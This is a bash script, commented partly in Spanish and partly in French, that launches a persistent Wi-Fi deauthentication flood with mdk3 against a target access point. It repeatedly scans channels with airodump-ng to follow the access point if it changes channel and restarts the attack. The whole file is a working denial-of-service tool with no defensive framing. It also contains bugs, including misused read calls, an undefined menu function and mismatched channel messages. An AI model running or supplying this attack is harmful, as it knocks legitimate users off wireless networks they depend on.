#!/bin/bash
echo $$ >/tmp/terminal.pid

#####################################################

f_variables(){
intmoniteur="$(cat cartedos.txt)"
canal="$(cat apcanal.txt)"
BSSID="$(cat apmac.txt)"
ESSID="$(cat ssid.txt)"
echo "$intmoniteur"
while [ -z "${intmoniteur}" ]; do read -r ${intmoniteur}; done



echo "$canal"
while [ -z "${canal}" ]; do read -r ${canal}; done



echo "$BSSID"
while [ -z ${BSSID} ]; do read -r ${BSSID}; done



echo "$ESSID"
while [ -z "${ESSID}" ]; do read -r ${ESSID}; done
f_floodinstantane
}


#####################################################

f_checkap(){              
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c $canal --essid ${ESSID} -w track ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP no ha movido, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/mdk3.pid`
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP ha movido... buscando le...\e[0m"
sleep 1;
rm -rf track*
kill `cat /tmp/mdk3.pid`
kill `cat /tmp/airodump.pid`
sleep 5;
fi

canal=1
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track1 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track1-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 1, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en canal 1... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=11
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track11 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track11-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 11, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en canal 11... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=6
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track6 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 5;
if grep -q "${BSSID}" "track6-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 6, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en canal 6... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=13
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track13 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track13-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 13, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en canal 13... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=5
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track5 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track5-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 5, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en canal 3... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=12
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track12 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track12-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 12, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=3
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track3 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track3-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 3, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=10
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track10 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track10-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 10, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=7
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track7 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track7-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 7, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=2
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track2 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track2-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 2, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=8
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track8 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track8-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 8, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=4
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track4 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track4-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 4, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=9
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track9 ${intmoniteur}mon &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track9-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 9, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi
}

#####################################################

f_floodinstantane(){       # boucle 1 qui test le contenu du fichier en appelant la fonction boucle 2 toute les x seconde  (fonction juste au dessus f_checkap)
           echo -e "\e[1;34m[*]\e[0m Iniciando el DoS... el canal del AP  va a estar vérificando cada tiempo en segundas que has entrado..."
sleep 1;
xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteur}mon d -g -t ${BSSID} -c ${canal} &> /dev/null &
echo $! >/tmp/mdk3.pid
sleep 4;
while : ; do
sleep 720 ; f_checkap ; done
}


#####################################################
f_activedos(){
clear
echo "1.  Dos"
read -p "Choix: " menuchoix
case ${menuchoix} in
1) unset clean; f_floodinterface ;;
*) f_activedos ;;
esac
}


# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[!]\e[0m Ve te pedir al admin !" 1>&2
	exit 1
else
	clean=1
	f_variables
fi
